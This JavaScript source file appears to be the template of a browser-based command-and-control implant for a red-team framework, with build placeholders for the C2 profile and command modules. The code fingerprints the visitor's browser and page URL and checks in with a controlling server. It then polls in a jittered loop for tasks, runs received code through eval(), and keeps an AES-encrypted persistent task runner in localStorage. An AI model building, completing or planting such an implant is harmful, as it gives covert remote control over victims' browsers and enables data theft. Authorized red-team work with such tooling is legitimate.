function get_browser() {
    var nVer = navigator.appVersion;
    var nAgt = navigator.userAgent;
    var browserName  = navigator.appName;
    var fullVersion  = ''+parseFloat(navigator.appVersion); 
    var majorVersion = parseInt(navigator.appVersion,10);
    var nameOffset,verOffset,ix;
    if ((verOffset=nAgt.indexOf("Opera"))!=-1) {
        browserName = "Opera";
        fullVersion = nAgt.substring(verOffset+6);
    if ((verOffset=nAgt.indexOf("Version"))!=-1) 
        fullVersion = nAgt.substring(verOffset+8);
    }
    else if ((verOffset=nAgt.indexOf("MSIE"))!=-1) {
        browserName = "Microsoft Internet Explorer";
        fullVersion = nAgt.substring(verOffset+5);
    }
    else if ((verOffset=nAgt.indexOf("Chrome"))!=-1) {
        browserName = "Chrome";
        fullVersion = nAgt.substring(verOffset+7);
    }
    else if ((verOffset=nAgt.indexOf("Safari"))!=-1) {
        browserName = "Safari";
        fullVersion = nAgt.substring(verOffset+7);
    if ((verOffset=nAgt.indexOf("Version"))!=-1) 
        fullVersion = nAgt.substring(verOffset+8);
    }
    else if ((verOffset=nAgt.indexOf("Firefox"))!=-1) {
        browserName = "Firefox";
        fullVersion = nAgt.substring(verOffset+8);
    }
    else if ( (nameOffset=nAgt.lastIndexOf(' ')+1) < 
            (verOffset=nAgt.lastIndexOf('/')) ) 
    {
        browserName = nAgt.substring(nameOffset,verOffset);
        fullVersion = nAgt.substring(verOffset+1);
        if (browserName.toLowerCase()==browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }
    if ((ix=fullVersion.indexOf(";"))!=-1)
        fullVersion=fullVersion.substring(0,ix);
    if ((ix=fullVersion.indexOf(" "))!=-1)
        fullVersion=fullVersion.substring(0,ix);

    majorVersion = parseInt(''+fullVersion,10);
    if (isNaN(majorVersion)) {
        fullVersion  = ''+parseFloat(navigator.appVersion); 
        majorVersion = parseInt(navigator.appVersion,10);
    }
    return navigator.userAgent;
}
get_tab_id = function(){
    var tabID = sessionStorage.tabID && 
            sessionStorage.closedLastTab !== '2' ? 
            sessionStorage.tabID : 
            sessionStorage.tabID = Math.random();
            sessionStorage.closedLastTab = '2';
    return tabID;
}
class agent{
	constructor(){
		this.id = get_tab_id();
		this.user = "N/A";
		this.fullName = "N/A";
		this.ip = "N/A" 
		this.pid = "N/A";
		this.host = get_browser();
		this.environment = "N/A";
		this.uptime = "N/A";
		this.args = "N/A";
		this.osVersion = window.location['href'];
		this.uuid = "UUID_HERE";
	}
}
var bowser = new agent();
class baseC2{
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
		this.commands = [];
	}
	checkin(){
	}
	getTasking(){
	}
	getConfig(){
	}
	postResponse(task, output){
	}
	setConfig(params){
	}
	download(task, params){
	}
	upload(task, params){
	}
}
C2PROFILE_HERE
default_load = function(contents){
    var module = {exports: {}};
    var exports = module.exports;
    if(typeof contents == "string"){
        eval(contents);
    }
    else{
        eval(contents.js);
    }
    return module.exports;
};
base64_decode = function(data){
    var decoded_data = atob(data)
    return decoded_data;
};
base64_encode = function(data){
    var encoded = btoa(data)
    return encoded;
};
async function encrypt_runner(data){
    var textBytes = aesjs.utils.utf8.toBytes(data);
    var IV = Uint8Array.from({length: 16}, () => Math.floor(Math.random() * 16));
    var aesCbc = new aesjs.ModeOfOperation.cbc(new Uint8Array(C2._base64ToArrayBuffer(localStorage.getItem('aes_psk'))), IV);
    textBytes = aesjs.padding.pkcs7.pad(textBytes);
    var encryptedData = aesCbc.encrypt(textBytes);
    var final_message = new Uint8Array(IV.length + encryptedData.length);	
    final_message.set(IV);
    final_message.set(encryptedData,IV.length);
    return encodeURIComponent(ethereumjs.Buffer.Buffer.from(final_message).toString('base64'));
}
async function decrypt_runner(data){
    data = decodeURIComponent(data);
    data = C2._base64ToArrayBuffer(data);
    var iv_range = data.slice(0,16);
    var message_range = data.slice(16);
    var aesCbc = new aesjs.ModeOfOperation.cbc(new Uint8Array(C2._base64ToArrayBuffer(localStorage.getItem('aes_psk'))), new Uint8Array((iv_range)));
    var decryptedData = aesjs.padding.pkcs7.strip(aesCbc.decrypt(new Uint8Array(message_range)));
    return new TextDecoder().decode(decryptedData);
}
isAsync  = function(fn) {
    return fn.constructor.name === 'AsyncFunction';
}
var exports = {}; 
COMMANDS_HERE
var commands_dict = exports;
var jsimport = "";
let ip_found = false;
C2.commands =  Object.keys(commands_dict);
async function sleepWakeUp(interval, jitter){
    while(true){
        let output = "";
        let task = await C2.getTasking();
        if (localStorage.getItem('runner') != undefined){
            dec_runner = await decrypt_runner(localStorage.getItem('runner'));
            dec_runner = JSON.parse(dec_runner)
            Object.keys(dec_runner).forEach(async function(key) {
                if (dec_runner[key][2] === false){
                    if (isAsync(commands_dict["aux_"+dec_runner[key][1]])){
                        out_runner = await commands_dict["aux_"+dec_runner[key][1]](dec_runner[key][0], dec_runner[key][1], dec_runner[key][0]['parameters'], dec_runner[key][2]);
                    }
                    else{
                        out_runner = commands_dict["aux_"+dec_runner[key][1]](dec_runner[key][0], dec_runner[key][1], dec_runner[key][0]['parameters'], dec_runner[key][2]);
                    }
                    CHANGE_PROFILE_DEFC2.postResponse(dec_runner[key][0], out_runner);
                }else{
                    delete dec_runner[key]
                    enc_runner_info = await encrypt_runner(JSON.stringify(dec_runner));
                    localStorage.setItem('runner',enc_runner_info);
                }
            });
        }
	if (task != null){
        let command = "";
        try{
        	if(task.length === 0){
			await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));
        		continue;
        	}
        	task = task[0];
            command = task["command"];
            try{
                if (isAsync(commands_dict[command])){
                    output = await commands_dict[command](task, command, task['parameters']);
                }
                else{
                    output = commands_dict[command](task, command, task['parameters']);
                }
                //if task not in dict
                //    store task on runner dict
                //else
                //    pass
                if (output['status'] == 'mid'){
                    temp_runner = JSON.parse(localStorage.getItem('runner'));
                    if (temp_runner == undefined){
                        temp_runner = {}
                    }
                    if (temp_runner[task['id']] == undefined){
                        temp_runner[task['id']] = [task,command,false];
                        enc_runner_info = await encrypt_runner(JSON.stringify(temp_runner));
                        localStorage.setItem('runner',enc_runner_info);
                    }
                }
            }
            catch(error){
                if(error.toString().includes("commands_dict[command] is not a function")){
                    output ={"user_output": "Unknown command: " + command, "status": "error", "completed": true};
                }
                else{
                    output = {"user_output": error.toString(), "status": "error", "completed": true};
                }
            }
            //for task in runner:
            //    run postResponse on task
            CHANGE_PROFILE_DEFC2.postResponse(task, output);
	    await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));
        }
        catch(error){
            CHANGE_PROFILE_DEFC2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
	    var last_seen = new Date(JSON.parse(localStorage.getItem('last_seen')));
	    last_seen.setSeconds(last_seen.getSeconds() + (2 * gen_sleep_time(C2.interval,C2.jitter))/1000)
	    if(last_seen < current_time){
	        localStorage.setItem('tab_id',tabID);
	    }
	    await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));
        }
}else{
	await new Promise(r => setTimeout(r, this.gen_sleep_time(C2.interval, C2.jitter)));}
	var last_seen = new Date(JSON.parse(localStorage.getItem('last_seen')));
	    last_seen.setSeconds(last_seen.getSeconds() + (2 * gen_sleep_time(C2.interval,C2.jitter))/1000)
	var current_time = new Date();
	if(last_seen < current_time){
	        localStorage.setItem('tab_id',tabID);
	    }
    }
}
function gen_sleep_time(interval, jitter){
      if(jitter < 1){return interval;}
      let plus_min = this.get_random_int(1);
      if(plus_min === 1){
          return (interval + (interval * (this.get_random_int(jitter)/100)))*1000;
      }else{
          return (interval - (interval * (this.get_random_int(jitter)/100)))*1000;
      }
    }
function get_random_int(max) {
    return Math.floor(Math.random() * Math.floor(max + 1));
}
var tabID = sessionStorage.tabID && 
            sessionStorage.closedLastTab !== '2' ? 
            sessionStorage.tabID : 
            sessionStorage.tabID = Math.random();
if (localStorage.getItem('tab_id') == null){
    localStorage.setItem('tab_id',tabID);
}
localStorage.setItem('last_seen',JSON.stringify(new Date()));
C2.checkin("127.0.0.1",0,bowser.user,window.location['href'],"N/A", "N/A", get_browser());
sleepWakeUp(C2.interval, C2.jitter);
